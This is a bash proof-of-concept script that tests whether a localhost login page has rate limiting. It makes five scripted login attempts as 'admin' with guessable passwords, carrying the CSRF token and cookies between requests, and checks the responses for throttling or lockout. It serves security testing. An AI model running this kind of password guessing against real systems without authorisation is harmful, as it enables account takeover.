#!/bin/bash

# POC: Brute Force Attack - No Rate Limiting Protection
# Target: http://localhost/accounts/login/
# Description: Attempts multiple sequential login attempts to demonstrate lack of rate limiting

TARGET_URL="http://localhost/accounts/login/"
USERNAME="admin"
NUM_ATTEMPTS=5
ATTEMPT_COUNT=0
RATE_LIMITED=0

echo "=========================================="
echo "Brute Force Protection POC"
echo "=========================================="
echo "Target URL: $TARGET_URL"
echo "Username: $USERNAME"
echo "Number of Attempts: $NUM_ATTEMPTS"
echo ""

# First, get the CSRF token from the login page
echo "[*] Step 1: Fetching login page and extracting CSRF token..."
LOGIN_PAGE=$(curl -s -c /tmp/cookies.txt "$TARGET_URL")
CSRF_TOKEN=$(echo "$LOGIN_PAGE" | grep -oP 'name="csrfmiddlewaretoken"\s+value="\K[^"]+' || echo "")

if [ -z "$CSRF_TOKEN" ]; then
    echo "[!] Warning: Could not extract CSRF token, proceeding without it..."
else
    echo "[+] CSRF Token extracted: ${CSRF_TOKEN:0:20}..."
fi

echo ""
echo "[*] Step 2: Attempting multiple login attempts with different passwords..."
echo ""

# Make multiple login attempts with different passwords
for i in $(seq 1 $NUM_ATTEMPTS); do
    PASSWORD="password$i"
    echo "[Attempt $i/$NUM_ATTEMPTS] Trying username=$USERNAME, password=$PASSWORD"
    
    # Prepare POST data
    POST_DATA="username=$USERNAME&password=$PASSWORD"
    if [ -n "$CSRF_TOKEN" ]; then
        POST_DATA="csrfmiddlewaretoken=$CSRF_TOKEN&$POST_DATA"
    fi
    
    # Make the login attempt
    RESPONSE=$(curl -s -i -b /tmp/cookies.txt -c /tmp/cookies.txt \
        -X POST \
        -d "$POST_DATA" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Referer: $TARGET_URL" \
        "$TARGET_URL" 2>&1)
    
    # Extract status code
    STATUS_CODE=$(echo "$RESPONSE" | head -n 1 | grep -oP '\d{3}')
    echo "  → HTTP Status: $STATUS_CODE"
    
    # Check for rate limiting indicators
    if echo "$RESPONSE" | grep -qi "retry-after\|rate.limit\|too many\|throttle"; then
        echo "  → [RATE LIMITED] Rate limiting detected!"
        ((RATE_LIMITED++))
    fi
    
    # Check for account lockout messages
    if echo "$RESPONSE" | grep -qi "locked\|locked out\|account.*disabled\|try again later"; then
        echo "  → [LOCKED OUT] Account lockout detected!"
        ((RATE_LIMITED++))
    fi
    
    # Check for Retry-After header
    if echo "$RESPONSE" | grep -qi "^retry-after:"; then
        RETRY_AFTER=$(echo "$RESPONSE" | grep -i "^retry-after:" | head -1)
        echo "  → [RATE LIMITED] Retry-After header present: $RETRY_AFTER"
        ((RATE_LIMITED++))
    fi
    
    # Check for rate limit headers
    if echo "$RESPONSE" | grep -qi "x-ratelimit"; then
        RATE_LIMIT_INFO=$(echo "$RESPONSE" | grep -i "x-ratelimit" | head -1)
        echo "  → [RATE LIMITED] Rate limit header: $RATE_LIMIT_INFO"
        ((RATE_LIMITED++))
    fi
    
    if [ $i -lt $NUM_ATTEMPTS ]; then
        echo "  → [OK] No rate limiting detected, proceeding to next attempt..."
    fi
    echo ""
    
    # Small delay between attempts to simulate realistic timing
    sleep 0.5
done

echo "=========================================="
echo "Results Summary:"
echo "=========================================="
echo "Total Attempts: $NUM_ATTEMPTS"
echo "Rate Limited Responses: $RATE_LIMITED"
echo ""

if [ $RATE_LIMITED -eq 0 ]; then
    echo "[VULNERABLE] No rate limiting or brute force protection detected!"
    echo "An attacker can make unlimited login attempts without restrictions."
    exit 0
else
    echo "[PROTECTED] Rate limiting or brute force protection is in place."
    exit 1
fi